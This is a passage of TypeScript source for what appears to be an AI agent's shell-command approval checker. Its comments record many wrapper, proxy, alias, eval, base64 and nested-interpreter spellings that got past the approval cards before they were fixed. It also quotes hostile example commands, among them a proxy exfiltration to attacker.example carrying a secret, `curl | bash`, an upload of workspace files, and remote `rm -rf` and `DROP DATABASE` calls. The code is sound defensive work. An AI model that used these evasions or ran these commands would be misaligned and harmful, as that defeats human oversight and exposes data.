  'nslookup',
  'pip',
  'pip3',
  'ping',
  'pnpm',
  'wget',
  'yarn'
]);
/**
 * The proxy a command was handed in its environment, rewritten as the option it is.
 *
 * `http_proxy=attacker.example:3128 curl https://docs.example.com/g?q=SECRET` sends every byte to
 * the proxy and nothing to the host in the URL, and an assignment in front of a command is dropped
 * by `withoutRunners` before any reader sees it - so the request was charged against a host the
 * owner had named, raised no card, and went somewhere else. That is the `--resolve` shape again:
 * not an address this cannot read, but one it read confidently and got wrong, which is the worse of
 * the two because nothing looks unusual afterwards.
 *
 * Rewritten as `--proxy` rather than given a reader of its own, because that is what the variable
 * means and `--proxy` is already understood here as somewhere on the network - deliberately absent
 * from the local-value tables for exactly that reason. `no_proxy` is an exclusion rather than a
 * destination and is not here.
 *
 * Only for the clients that honour it: a proxy variable in front of a program that ignores it names
 * nowhere the bytes go, and carding that would be carding the environment rather than the request.
 * Which clients those are is `PROXY_HONOURING_EXECUTABLES`, and it is a wider list than the clients
 * whose own arguments are read for an address: `pip`, `npm`, `gh` and `git` are asked for no
 * address because their remote lives in configuration, and every one of them still opens its
 * socket at the proxy when the variable is set.
 */
const PROXY_VARIABLES = new Set([
  'all_proxy',
  'ftp_proxy',
  'http_proxy',
  'https_proxy',
  'rsync_proxy'
]);

/**
 * The words of a script as assignments are found in it: split on whitespace AND on the operators
 * and brackets a shell puts flush against a word, with a leading quote taken off.
 *
 * Split on whitespace alone, the assignment that opens a subshell or follows an operator with no
 * space is one token with the operator glued on - `(https_proxy=x`, `true;https_proxy=x`,
 * `x=$(https_proxy=x`, `echo x|https_proxy=x` - and an assignment regex anchored at the start of
 * the token matches none of them. Measured on this tree, every one of those spellings in front of
 * `pip download <token>` was 0 destinations and no card in balanced or autonomous, while the same
 * script with one space after the bracket carded. The quote is the `env -S '…'` shape, where the
 * whole command line is one quoted word and the assignment is its first character after the quote.
 */
const assignmentWords = (body: string): string[] =>
  body
    .split(/[\s;&|(){}`]+/)
    .map((word) => word.replace(/^['"]+/, ''))
    .filter(Boolean);

const proxyOptionsFrom = (tokens: readonly string[], executable: string): string[] => {
  if (!honoursProxy(executable)) return [];
  const options: string[] = [];
  for (const token of tokens) {
    const assignment = /^([A-Za-z_][A-Za-z0-9_]*)=(.+)$/.exec(token);
    if (!assignment) continue;
    const [, name = '', value = ''] = assignment;
    // A body split on whitespace keeps the operator that ended the command, so `export
    // http_proxy=x:3128;` carries the semicolon into the port and quietly loses it; a quoted value
    // keeps its closing quote the same way.
    if (PROXY_VARIABLES.has(name.toLowerCase())) {
      const bare = value.replace(/[;&|)'"]+$/, '').replace(/^['"]+/, '');
      if (bare) options.push('--proxy', bare);
    }
  }
  return options;
};

/**
 * The commands a script actually runs, each one as [executable, ...arguments].
 *
 * The shell tool's own description tells the model to reach for `bash -lc` the moment it needs a
 * pipe, a glob or a redirect, so most real work arrives wrapped in an interpreter. Every other
 * classifier here already reads the real script through commandScript; the network allowlist was
 * the last policy still matching on the name of the wrapper, so `curl -O https://x` was allowlisted
 * and `bash -lc 'curl -O https://x'` - the same fetch - was an unknown executable. In autonomous
 * mode that is a card in front of nearly everything, and one download produced two of them.
 *
 * This is deliberately not a shell parser. It splits on the operators that begin a new command and
 * keeps the leading word of each, which is enough to name what runs. Anything it cannot read comes
 * back as no commands at all, and the caller treats that as unknown rather than as safe.
 */
const nestedScript = (tokens: readonly string[]): string[] => {
  const at = tokens.findIndex(
    (token) => isInlineScriptFlag(token) || isInlineScriptFlag(token.split('=')[0] ?? '')
  );
  return at < 0
    ? []
    : withoutRunners(tokens.slice(at + 1))
        .map(unquoted)
        .filter(Boolean);
};

/**
 * The program a Python interpreter runs when it is told `-m`: the module IS the program.
 *
 * `python -m pip download <token>` is the spelling pip's own documentation recommends and it
 * honours `https_proxy` exactly as `pip` does; read as a command called `python3`, the proxy in
 * front of it was credited to a program that ignores it and the request was 0 destinations. The
 * module is emitted beside the interpreter command, as a command of its own with the module's
 * arguments, so every reader that has an opinion about `pip` or `twine` sees it. Only Python:
 * `-m` means something else on every other interpreter here.
 */
const moduleRun = (executable: string, tokens: readonly string[]): string[] => {
  if (!/^python[0-9.]*$/.test(executable)) return [];
  const at = tokens.indexOf('-m');
  const module = unquoted(tokens[at + 1] ?? '');
  return at < 0 || !module ? [] : [module, ...tokens.slice(at + 2).map(unquoted)];
};

const commandsFromBody = (body: string): string[][] => {
  /*
   * A proxy set anywhere in a script applies to every fetch after it, and `export http_proxy=x;
   * curl y` puts the two in different segments, so a scan of one segment sees neither half of the
   * pair. Read once over the whole body instead. It over-reaches by the width of a script - an
   * assignment after the fetch is credited to it, and one inside a branch that never runs is
   * credited too - which costs a card on a shape that would not have used the proxy, and the
   * alternative is missing the shape that does.
   */
  const bodyTokens = assignmentWords(body);
  return body.split(/\$\(|[|;&\n`]+/).flatMap((segment) => {
    /*
     * `FOO=1 curl https://x` runs curl, and so do `timeout 30 curl …` and `then curl …`. Whatever
     * sits in front of the command is setup for it, not a command of its own, and treating it as
     * one made every such line unknown.
     *
     * AND WHATEVER CLOSES IT, which was the same defect at the other end of the segment and left a
     * one-character bypass of everything this file does. The opening `(` and `{` came off and the
     * matching `)` and `}` did not, so the LAST token of a subshell kept its bracket and matched no
     * table. Measured on this tree before this line, in balanced and autonomous: `(npm publish)`,
     * `(sudo npm publish)`, `(cd dist && npm publish)`, `(apt-get install nginx)` and
     * `$(npm publish)` all raised NOTHING, while `{ npm publish; }` beside them carded - because
     * the `;` split that brace form and there is no `;` in the paren one. The same missing strip
     * put a card in front of the owner naming a program that does not exist:
     * `(curl -sSL https://x | bash)` read as "Review network access for bash)".
     *
     * The trailing class is exactly the leading one and carries the same imprecision, deliberately:
     * a closing bracket really can be the last character of an operand, and losing it costs the
     * path of a URL whose host - the only part any reader here asks about - is decided before it.
     */
    const tokens = withoutRunners(
      segment
        .replace(/^[\s({]+/, '')
        .replace(/[\s)}]+$/, '')
        .split(/\s+/)
        .filter(Boolean)
    );
    const executable =
      unquoted(tokens.shift() ?? '')
        .split('/')
        .pop() ?? '';
    // `2>&1` is split by the `&` above into `2>` and `1`, and the tail was then read as a command
    // called `1`. Nothing executes a program whose name is a number, and the cost of pretending
    // otherwise was measured: in autonomous mode `bash -lc 'curl -sSL https://x 2>&1'` raised
    // "Review network access for 1" - a card naming a command that does not exist, in front of
    // the single most common idiom in shell - and every write classifier downstream saw a segment
    // it could not place. Dropped here rather than by not splitting on `&`, because a trailing
    // `&` really does end a command and this is the only shape that survives the split.
    if (!executable || /^\d+$/.test(executable)) return [];
    const command = [executable, ...tokens, ...proxyOptionsFrom(bodyTokens, executable)];
    /*
     * AN INTERPRETER INSIDE A SCRIPT is the prefix defect one level down, and it was live:
     * `bash -lc 'sh -c "npm publish"'` and `bash -lc "bash -c 'vercel --prod'"` raised NOTHING in
     * balanced or autonomous, while the same call written as `{ executable: 'sh', args: ['-c',
     * 'npm publish'] }` carded in all three. `commandScript` reads the OUTER call's `-c` and
     * `stdin`, so the outer script is read once and whatever is quoted inside it stays a pair of
     * word-shaped tokens nobody re-parses.
     *
     * Emitted BESIDE the segment rather than instead of it, so nothing that reads the outer form
     * loses it, and every reader that keys on a command sees the inner one too. Unquoted, because
     * the inner script arrives as `"npm` and `publish"` - the shell would have taken those quotes
     * off before anything ran.
     */
    const nested: string[][] = [];
    let inner = commandInterpreters.has(executable)
      ? ([nestedScript(tokens), moduleRun(executable, tokens)].find((found) => found.length) ?? [])
      : [];
    /*
     * AND AGAIN, for as long as the thing inside is another interpreter. One level was measured and
     * repaired; two was not, and `bash -lc 'sh -c "bash -c \'npm publish\'"'` and
     * `bash -lc "bash -c 'sh -c \"vercel --prod\"'"` raised NOTHING outside review while the
     * one-level spelling beside them carded. The walk that reads the inner command stops at the
     * first name it knows, and `bash` is a name it knows - so a second wrapper turned the whole
     * rule off again.
     *
     * Bounded at four rather than left to terminate on its own: each pass slices past an inline
     * flag and so must shorten, but a bound that is stated cannot be argued about, and nothing
     * anybody writes on purpose nests four interpreters.
     *
     * The proxy is appended to the inner command as it is to the outer one, because the inner
     * command inherits the environment: `sh -c "https_proxy=x pip download …"` sets it inside and
     * `https_proxy=x sh -c "pip download …"` sets it outside, and both open pip's socket at the
     * proxy. Read over the whole body, the assignment is found either way; while only the outer
     * command was given the option, both spellings were 0 destinations - and the head of the
     * outer one is `sh`, which honours no proxy of its own.
     */
    for (let depth = 0; inner.length && depth < 4; depth += 1) {
      const head = (inner[0] ?? '').split('/').pop() ?? '';
      nested.push([...inner, ...proxyOptionsFrom(bodyTokens, head)]);
      inner = commandInterpreters.has(head)
        ? ([nestedScript(inner.slice(1)), moduleRun(head, inner.slice(1))].find(
            (found) => found.length
          ) ?? [])
        : [];
    }
    return [command, ...nested];
  });
};

/**
 * The names an identity substitution resolves to whatever program it is handed.
 *
 * `$(which npm)` prints the path to npm, `$(command -v npm)` prints npm, `` `type -p npm` `` prints
 * its path: all three run npm afterwards, and the head this file reads was the substitution's own
 * inner command (`which`) instead. These four are the ones whose whole job is to name a program, so
 * `$(which X)` can be rewritten to `X` without guessing - unlike `$(cat url.txt)`, whose output is
 * not its argument and which stays unresolved for the taint rule to keep asking about.
 */
const IDENTITY_LOOKUP = String.raw`which|type\s+-[pP]|command\s+-v[p]?|hash\s+-[pt]`;

/**
 * A body with the run-time indirections this file CAN resolve rewritten to what they resolve to.
 *
 * A card keyed on the head of a command is defeated the same way whether the head is wrapped
 * (`sudo npm publish`, already handled) or PRODUCED - by a substitution the shell runs first
 * (`$(which npm) publish`), by a variable the script assigned a line earlier (`n=npm; $n publish`),
 * or by a parameter default (`${NPM:-npm} publish`). None of these is a wrapper, so `withoutRunners`
 * never saw them; each is an ordinary shell expansion whose result is written down in the same
 * script, so it can be resolved rather than guessed. What CANNOT be resolved - a variable with no
 * assignment in view (`curl -s "$U"`), a substitution whose output is not its argument
 * (`$(cat url.txt)`) - is left exactly as written, so the taint rule that depends on `$U` staying
 * `$U` is untouched. The rewrite runs alongside the raw body, never instead of it, so no reader
 * that already saw the literal shape loses it.
 */
const expandIndirections = (body: string): string => {
  let out = body;
  const identity = new RegExp(String.raw`\$\(\s*(?:${IDENTITY_LOOKUP})\s+([^)\s]+)\s*\)`, 'g');
  const identityBackquote = new RegExp(
    String.raw`\`\s*(?:${IDENTITY_LOOKUP})\s+([^\s\`]+)\s*\``,
    'g'
  );
  const echoSub = /\$\(\s*(?:echo|printf)\s+([^)]*?)\s*\)/g;
  const echoBackquote = /`\s*(?:echo|printf)\s+([^`]*?)\s*`/g;
  out = out
    .replace(identity, '$1')
    .replace(identityBackquote, '$1')
    .replace(echoSub, '$1')
    .replace(echoBackquote, '$1');
  /*
   * A program copied or linked to a new name, and then run under it.
   *
   * `ln -s /usr/bin/pip ./p; https_proxy=x ./p download <token>` runs pip, and the head this file
   * read was `p` - a name no table holds, so the proxy in front of it was environment for nothing
   * and the request was 0 destinations in both modes. Two ordinary local commands turned every
   * client this file knows into one it could not see. The copy is written down in the same
   * script, so the new name is rewritten to the program it was made from wherever it stands as a
   * head - and only as a head, with the assignments in front of it kept, since `./p` as an operand
   * of something else is a file. Resolved for `cp`, `ln` and `install`, whose last operand is the
   * new name; `cp -t DIR` puts the operands on the other side and is not read.
   */
  const copies = new Map<string, string>();
  for (const match of out.matchAll(
    /(?:^|[;&|(\n]|\bthen\b|\bdo\b)\s*(?:cp|ln|install)\s+(?:-[A-Za-z]+\s+)*(\S+)\s+(\S+)\s*(?=$|[;&|)\n])/g
  )) {
    const source = (match[1] ?? '').split('/').pop() ?? '';
    const copy = match[2] ?? '';
    if (source && copy && !/[$`*?[\]{}]/.test(copy) && !copy.startsWith('-'))
      copies.set(copy, source);
  }
  for (const [copy, source] of copies) {
    const escaped = copy.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');
    out = out.replace(
      new RegExp(
        String.raw`(^|[;&|(\n]|\bthen\b|\bdo\b)(\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*)${escaped}(?=\s|$)`,
        'g'
      ),
      `$1$2${source}`
    );
  }
  // Assignments whose value is a single word are the only ones usable as a head or an operand; a
  // multi-word value is left alone rather than pasted in as one token.
  const assignments = new Map<string, string>();
  for (const match of out.matchAll(
    /(?:^|[;&|(\n]|\bthen\b|\bdo\b)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
  )) {
    const value = match[2] ?? match[3] ?? match[4] ?? '';
    // A single word with nothing left to expand: a value that still holds a `$` (`PATH=x:$PATH`) is
    // not resolved to a literal and pasting it in would only rewrite the body to another unresolved
    // form - and to a spurious second copy of a command that never changed.
    if (!/\s/.test(value) && !value.includes('$')) assignments.set(match[1] ?? '', value);
  }
  // `set -- a b c` sets the positional parameters, and `"$@"` then replays them.
  const positional = /(?:^|[;&|\n])\s*set\s+--\s+([^\n;&|]*)/
    .exec(out)?.[1]
    ?.trim()
    .split(/\s+/)
    .filter(Boolean);
  // A parameter default fills in when the name is unset, which for a name this never saw assigned is
  // always: `${NPM:-npm}` and `${x:-publish}` are the value the script chose to fall back to.
  out = out.replace(
    /\$\{([A-Za-z_][A-Za-z0-9_]*):[-=]([^}]*)\}/g,
    (_whole, name: string, fallback: string) => assignments.get(name) ?? fallback
  );
  for (const [name, value] of [...assignments].sort(([a], [b]) => b.length - a.length)) {
    out = out
      .replace(new RegExp(String.raw`\$\{${name}\}`, 'g'), value)
      .replace(new RegExp(String.raw`\$${name}(?![A-Za-z0-9_])`, 'g'), value);
  }
  if (positional?.length) out = out.replace(/"\$@"|"\$\*"|\$@|\$\*/g, positional.join(' '));
  return out;
};

/**
 * The tokens a decode or an echo puts on the pipe, or null when this cannot compute them.
 *
 * `echo npm publish | …` and `base64 -d <<< bnBt… | …` both produce a command for whatever reads
 * the other end of the pipe, and both are computable here - the argument to `echo` is its output,
 * and a base64 body is a pure function of its input. A stage whose output this cannot compute
 * returns null, which stops the fold: a command assembled from output nobody can predict is not one
 * to raise a card about.
 */
const pipeStageOutput = (stage: string, carried: string | null): string | null => {
  const tokens = stage.split(/\s+/).filter(Boolean);
  const head = tokens[0] ?? '';
  if (head === 'echo') return tokens.slice(1).join(' ').replace(/["']/g, '');
  if (head === 'printf')
    return tokens
      .slice(1)
      .map((token) => token.replace(/["']/g, ''))
      .filter((token) => token !== '%s' && token !== '\\n')
      .join('');
  if (head === 'base64' && tokens.some((t) => t === '-d' || t === '-D' || t === '--decode')) {
    const hereString = /<<<\s*(?:"([^"]*)"|'([^']*)'|(\S+))/.exec(stage);
    const input = hereString ? (hereString[1] ?? hereString[2] ?? hereString[3] ?? '') : carried;
    if (input === null) return null;
    try {
      return Buffer.from(input, 'base64').toString('utf8');
    } catch {
      return null;
    }
  }
  return null;
};

/**
 * The command `xargs` will run, built from its template and the tokens arriving on its input.
 *
 * `echo publish | xargs npm` runs `npm publish`; `printf npm | xargs -I{} {} publish` runs
 * `npm publish` with the input pasted where the replacement string sits. The runner's own options
 * are stepped over the way `runnerBody` steps over `sudo`'s, so what is left is the command it
 * builds - which is the thing a publish card is about, and which was invisible while `xargs` was
 * read as the command itself.
 */
const xargsCommand = (rest: readonly string[], carried: string | null): string[][] => {
  if (carried === null) return [];
  const inputTokens = carried.split(/\s+/).filter(Boolean);
  let replacement: string | null = null;
  let index = 0;
  for (; index < rest.length; index += 1) {
    const token = rest[index] ?? '';
    if (token.startsWith('-I') && token.length > 2) {
      replacement = token.slice(2);
      continue;
    }
    if (token === '-I' || token === '-i' || token === '--replace') {
      replacement = rest[index + 1] ?? '{}';
      index += token === '--replace' || token === '-i' ? 0 : 1;
      continue;
    }
    if (token.startsWith('--replace=')) {
      replacement = token.slice('--replace='.length);
      continue;
    }
    if (
      ['-n', '-L', '-P', '-d', '-a', '--max-args', '--max-procs', '--delimiter'].includes(token)
    ) {
      index += 1;
      continue;
    }
    if (token.startsWith('-')) continue;
    break;
  }
  const template = rest.slice(index);
  if (!template.length) return [];
  const command = replacement
    ? template.map((token) => (token === replacement ? inputTokens.join(' ') : token))
    : [...template, ...inputTokens];
  return commandsFromBody(command.join(' '));
};

/**
 * The commands a pipeline runs that its own text does not spell as commands.
 *
 * `… | xargs npm`, `… | bash` and `base64 -d <<< … | sh` all hand the next stage a command built
 * from an earlier one, and none of it is a command `commandsFromBody` reads by splitting on the
 * pipe. The output of each stage is folded forward; when a stage is an interpreter reading that
 * output as its script, or `xargs` building a command out of it, the result is emitted.
 */
const pipelineCommands = (statement: string): string[][] => {
  if (!statement.includes('|')) return [];
  const out: string[][] = [];
  let carried: string | null = null;
  for (const stage of statement
    .split('|')
    .map((part) => part.trim())
    .filter(Boolean)) {
    const tokens = stage.split(/\s+/).filter(Boolean);
    const head = (
      unquoted(tokens[0] ?? '')
        .split('/')
        .pop() ?? ''
    ).toLowerCase();
    if (head === 'xargs') {
      out.push(...xargsCommand(tokens.slice(1), carried));
      carried = null;
      continue;
    }
    // An interpreter with no script of its own reads the pipe as its script.
    if (
      commandInterpreters.has(head) &&
      carried !== null &&
      !tokens.slice(1).some((token) => !token.startsWith('-'))
    ) {
      out.push(...commandsFromBody(carried));
      carried = null;
      continue;
    }
    carried = pipeStageOutput(stage, carried);
  }
  return out;
};

/**
 * The publish or deploy a language runtime shells out to, which its argument list never spells.
 *
 * `python3 -c "import os; os.system('npm publish')"` and
 * `node -e "require('child_process').execSync('npm publish')"` run a publish through a string the
 * runtime hands back to a shell, and the tokens `commandsFromBody` sees are Python or JavaScript,
 * not a command. This is the publishing counterpart of the destructive-runtime-call rule: the exec
 * construct is recognised, the command string inside it is read, and it is emitted ONLY when it is
 * itself a publish or a deploy - so an ordinary `subprocess.run(['ls'])` adds nothing.
 */
const RUNTIME_EXEC_CALL =
  /(?:os\.system|os\.popen|os\.exec[a-z]*|subprocess\.(?:run|call|check_output|check_call|Popen)|commands\.getoutput|execFileSync|execSync|spawnSync|execFile|spawn|IO\.popen|popen|system|exec)\s*\(([^)]*)\)/g;
const runtimeExecPublishes = (body: string): string[][] => {
  const out: string[][] = [];
  const consider = (text: string): void => {
    for (const command of commandsFromBody(text))
      if (publishingOperation(command)) out.push(command);
  };
  for (const match of body.matchAll(RUNTIME_EXEC_CALL)) {
    const literals = [...(match[1] ?? '').matchAll(/"([^"]*)"|'([^']*)'/g)].map(
      (literal) => literal[1] ?? literal[2] ?? ''
    );
    if (literals.length) consider(literals.join(' '));
  }
  // Ruby's `%x{…}` and Perl's `%x(…)` run their contents through a shell exactly as the calls above.
  for (const match of body.matchAll(/%x[({]([^)}]*)[)}]/g)) consider(match[1] ?? '');
  return out;
};

/**
 * The commands reachable through a construct the shell resolves at run time, beside the raw ones.
 *
 * An alias whose body holds the operation (`alias np="npm publish"; np`), a script written to a
 * file and then run (`echo npm publish > p.sh; bash p.sh`), a here-string handed to an interpreter
 * (`bash <<< "npm publish"`), a pipeline that builds a command, and a language runtime shelling
 * out: each is a command whose text is somewhere in the script but not where a reader keyed on the
 * head of a segment looks. Every one is resolved from what the script itself wrote down; a
 * construct whose contents this cannot compute contributes nothing rather than a guess.
 */
const structuralCommands = (body: string): string[][] => {
  const out: string[][] = [];
  const aliases = new Map<string, string>();
  for (const match of body.matchAll(
    /\balias\s+([A-Za-z_][A-Za-z0-9_-]*)=(?:"([^"]*)"|'([^']*)'|(\S+))/g
  ))
    aliases.set(match[1] ?? '', match[2] ?? match[3] ?? match[4] ?? '');
  const writtenFiles = new Map<string, string>();
  /*
   * Every assignment, whatever the width of its value, for `eval` alone. `expandIndirections`
   * pastes a value in only when it is one word, because a multi-word value is not usable as a head
   * or an operand anywhere else; `eval $cmd` is the one place it is, since eval re-parses the text
   * as a command line. `cmd="npm publish"; eval $cmd` was 0 cards in both modes while the literal
   * `eval "npm publish"` carded - only the indirection escaped.
   */
  const values = new Map<string, string>();
  for (const match of body.matchAll(
    /(?:^|[;&|(\n]|\bthen\b|\bdo\b)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
  ))
    values.set(match[1] ?? '', match[2] ?? match[3] ?? match[4] ?? '');
  const statements = body
    .split(/[;&\n]+|\bthen\b|\bdo\b/)
    .map((part) => part.trim())
    .filter(Boolean);
  /*
   * `source f` and `. f` run a written file in the current shell exactly as `bash f` runs it in a
   * child, and they are the standard spellings for it; a regex naming only the interpreters
   * resolved `echo npm publish > p.sh; bash p.sh` and left `; source p.sh` and `; . p.sh` unread.
   */
  const interpreter = String.raw`(?:command\s+|exec\s+)?(?:(?:ba|da|z)?sh|python3?|node|perl|ruby|source|\.)`;
  for (const statement of statements) {
    const written =
      /^(?:echo|printf)\s+(.*?)\s*>>?\s*"?([^\s"']+)"?\s*$/.exec(statement) ??
      // `echo … | tee f` writes the file as surely as a redirect does, and nothing read it.
      /^(?:echo|printf)\s+(.*?)\s*\|\s*tee\s+(?:-[A-Za-z]+\s+)*"?([^\s"']+)"?\s*$/.exec(statement);
    if (written) writtenFiles.set(written[2] ?? '', (written[1] ?? '').replace(/["']/g, '').trim());
    const head = statement.split(/\s+/)[0] ?? '';
    if (aliases.has(head)) out.push(...commandsFromBody(aliases.get(head) ?? ''));
    const evaluated = /^eval\s+(.+)$/.exec(statement);
    if (evaluated) {
      const text = (evaluated[1] ?? '').replace(
        /\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g,
        (whole, name: string) => values.get(name) ?? whole
      );
      out.push(...commandsFromBody(text.replace(/["']/g, '')));
    }
    out.push(...pipelineCommands(statement));
    const hereString = new RegExp(
      String.raw`^${interpreter}\b.*?<<<\s*(?:"([^"]*)"|'([^']*)'|(\S+))`
    ).exec(statement);
    if (hereString)
      out.push(...commandsFromBody(hereString[1] ?? hereString[2] ?? hereString[3] ?? ''));
    const fileRun = new RegExp(String.raw`^${interpreter}\s+"?([^\s"']+)"?\s*$`).exec(statement);
    if (fileRun && writtenFiles.has(fileRun[1] ?? ''))
      out.push(...commandsFromBody(writtenFiles.get(fileRun[1] ?? '') ?? ''));
  }
  out.push(...runtimeExecPublishes(body));
  return out;
};

/**
 * Every command a script runs, read at three depths: as written, with the run-time indirections
 * this file can resolve rewritten to their result, and through the constructs that build a command
 * the segment text does not spell. The three are unioned rather than chosen between, so a reader
 * that already saw the raw shape keeps it and the resolved shapes are added beside it - the same
 * emitted-beside rule the nested-interpreter walk already follows.
 */
export const scriptCommands = (body: string): string[][] => {
  const base = commandsFromBody(body);
  const expanded = expandIndirections(body);
  return [
    ...base,
    ...(expanded === body ? [] : commandsFromBody(expanded)),
    ...structuralCommands(body)
  ];
};

/**
 * Every command a `shell` call will really run, with the wrappers taken off.
 *
 * Three shapes wear the same tool call. A bare command is itself. A runner - `env FOO=1 …`,
 * `timeout 30 …`, `nice -n 5 …`, `xargs …` - is setup for the command that follows it, so it comes
 * off along with its own options and any leading assignment. An interpreter is whatever its script
 * says, which is what `scriptCommands` reads.
 *
 * Every classifier that asked its question of `args.executable` alone answered it about the
 * wrapper instead. `bash -lc 'curl -d @workspace/notes https://x'` was a bash, so the upload card
 * the bare form raises did not fire on a clean turn; `bash -lc 'curl -s "$U"'` was a bash, so the
 * turn stayed clean while an attacker-chosen page arrived in it - and the literal-URL scan that
 * looked like it covered this only ever covered the spelling with the address written out. One arm
 * did read the script, the autonomous network allowlist, and it is where this shape comes from;
 * making it the shape every arm uses is the whole of the repair.
 *
 * An interpreter whose script cannot be read comes back as no commands at all, and the callers
 * treat that as unknown rather than as safe.
 */
export const effectiveCommands = (args: Record<string, unknown>): string[][] => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const raw = [textValue(args.executable), ...commandArgs];
  const tokens = withoutRunners(raw);
  const executable =
    unquoted(tokens[0] ?? '')
      .split('/')
      .pop() ?? '';
  if (commandInterpreters.has(executable)) {
    /*
     * A proxy set in front of the interpreter is inherited by everything the script runs:
     * `{ executable: 'env', args: ['https_proxy=x', 'sh', '-c', 'pip download …'] }` opens pip's
     * socket at the proxy exactly as the script spelling does. Read from the tokens the wrappers
     * took off - the prefix in front of the interpreter - and appended to each command the script
     * names that honours it. The script's own assignments are read by `commandsFromBody`.
     */
    const prefix = raw.slice(0, Math.max(0, raw.length - tokens.length));
    return scriptCommands(commandScript(args)).map((command) => [
      ...command,
      ...proxyOptionsFrom(prefix, command[0] ?? '')
    ]);
  }
  return executable ? [[executable, ...tokens.slice(1), ...proxyOptionsFrom(raw, executable)]] : [];
};

/**
 * The runners that carry a command across a boundary this computer's rewind does not cross.
 *
 * Written longest-first so `docker compose exec` is read as itself rather than as a `docker` whose
 * second word happens not to be `exec`. Every other subcommand of these tools is untouched, which
 * is the same reason `RUNNER_SUBCOMMANDS` is keyed on a pair: `docker volume rm` and
 * `docker compose down -v` are their own cards one table below, and stripping the head would have
 * taken them with it.
 */
const BOX_EXEC_RUNNERS: readonly (readonly string[])[] = [
  ['docker', 'compose', 'exec'],
  ['podman', 'compose', 'exec'],
  ['docker-compose', 'exec'],
  ['docker', 'exec'],
  ['kubectl', 'exec'],
  ['podman', 'exec']
];

/**
 * The command a container or pod runner hands to the other side, with the runner's own words off.
 *
 * DESTRUCTION.md recorded four shapes under one sentence - "a command that runs another command on
 * the far side of something this file can name" - and named `docker exec pg psql -c "DROP DATABASE
 * x"` and `kubectl exec pg -- psql -c "DROP …"` as the two of them that stay on this box's network.
 * Measured through the shipped `approvalRequirement` at 59d3e67: both FREE in balanced and
 * autonomous, along with `docker exec r redis-cli flushall` and `kubectl exec p -- rm -rf /data`.
 * The walk stops at `docker`, which `placeableExecutable` names, and never reaches the client.
 *
 * NOT A `RUNNER_SUBCOMMANDS` ENTRY, and that is the load-bearing decision. `withoutRunners` exists
 * to say "this is really the command that runs HERE", and these do not run here: the paths after
 * them belong to the other box's filesystem. Stripping `docker exec pg` in that function would have
 * handed `rm -rf dist` to the location rule with this machine's working directory attached, which
 * resolves to `workspace/dist`, which a rewind restores - and the delete would have been freed for
 * a directory inside a container that no checkpoint here has ever walked. So the inner command is
 * returned separately and its caller judges it as unplaceable, the way `commandsChangeDirectory`
 * already refuses a line that re-bases itself.
 *
 * The runner's own operands come off through `runnerBody`, the same reader that already gets
 * `sudo -u root` and `xargs -I {}` right, with the container or pod declared as one positional and
 * the value-taking options declared per runner. An option this file has not enumerated makes the
 * runner eat the container name instead, so the command read is the container's - a name no table
 * here matches, which is a MISS and not a false card. `docker run` is deliberately absent: its
 * operand is an image rather than a running box, its option surface is far wider, and
 * docs/design/gaps/BYPASS.md holds it as the open shape it remains.
 */
export const commandCarriedIntoAnotherBox = (
  tokens: readonly string[]
): { readonly carrier: string; readonly command: readonly string[] } | null => {
  const named = tokens.map((token) => (unquoted(token).split('/').pop() ?? '').toLowerCase());
  for (const runner of BOX_EXEC_RUNNERS) {
    if (!runner.every((word, at) => named[at] === word)) continue;
    const inner = runnerBody(runner.join(' '), tokens.slice(runner.length));
    return inner.length ? { carrier: runner.join(' '), command: inner } : null;
  }
  return null;
};

/**
 * Commands that answer a question about a file and change nothing in it.
 *
 * Not a security boundary and deliberately not exhaustive: it is the way *out* of the wide net in
 * `shellWriteTargets`, and a name missing from it costs one card the owner did not need rather than
 * a write nobody saw. The terminators are here because nothing follows them to be judged - a
 * segment that is only `fi` runs nothing at all - while the keywords that do have a command after
 * them are stripped by `withoutRunners` instead.
 */
const READ_ONLY_EXECUTABLES = new Set([
  '[',
  'awk',
  'base64',
  'basename',
  'cat',
  'cksum',
  'cmp',
  'column',
  'comm',
  'cut',
  'date',
  'df',
  'diff',
  'dirname',
  'done',
  'du',
  'echo',
  'esac',
  'false',
  'fd',
  'fi',
  'file',
  'find',
  'fold',
  'grep',
  'head',
  'hostname',
  'id',
  'jq',
  'less',
  'ls',
  'md5sum',
  'more',
  'nl',
  'od',
  'paste',
  'printf',
  'ps',
  'pwd',
  'readlink',
  'realpath',
  'rev',
  'rg',
  'sha1sum',
  'sha256sum',
  'sort',
  'stat',
  'tail',
  'test',
  'tr',
  'true',
  'type',
  'uname',
  'uniq',
  'wc',
  'which',
  'whoami',
  'xxd',
  'yq'
]);

/**
 * Where a redirect puts what it writes.
 *
 * `2>&1` and a duplicating `>&2` are excluded by construction - the target may not begin with `&` -
 * and so is the `->` an arrow in a comment or a string draws, by the lookbehind. A numbered
 * redirect is read, because `2>err.log` writes `err.log` as surely as `>err.log` does; the narrower
 * scan in `escapingRedirect` above can afford to skip those because it is only asked whether a
 * target leaves the workspace, and this one is asked which file is written.
 */
const REDIRECT_TARGET = /(?<![->])(?:&|\d)?>>?\s*['"]?([^\s'"`;|&()<>]+)/g;

/**
 * A write performed through a language runtime rather than through a redirect or a writing command.
 *
 * The same shape as `DESTRUCTIVE_RUNTIME_CALL` and there for the same reason. `shellWriteTargets`
 * can follow a `>` and it can follow a `tee`; it cannot follow `open(p, 'w')`, and it does not have
 * to - it only has to know that it cannot and hand the question back to the wide net. Without this,
 * a script whose first word happens to be a reader (`python3 -c "cat = open('.bashrc','w'); …"`)
 * would take the read-only exit.
 */
const RUNTIME_WRITE_CALL =
  /\b(?:open|fopen)\s*\([^)]*['"][^'")]*[wax][^'")]*['"]|\.(?:write|writeFile|writeFileSync|appendFile|appendFileSync|write_text|write_bytes|writelines|createWriteStream|copyfile|copytree|copy2|move|rename|renameSync|symlink|symlinkSync|link|mkdir|makedirs|touch|chmod|dump|save)\s*\(/;

/**
 * The paths a `shell` call can be *shown* to write, or null when it cannot be shown at all.
 *
 * `writtenPaths` used to hand its two callers every whitespace-and-punctuation token in the script,
 * which made `bash -lc 'cat ~/.bashrc'` raise "Change a file this computer runs on its own" - a
 * read carded as a write, in the product's most alarming class. The bare `cat` raised nothing, so
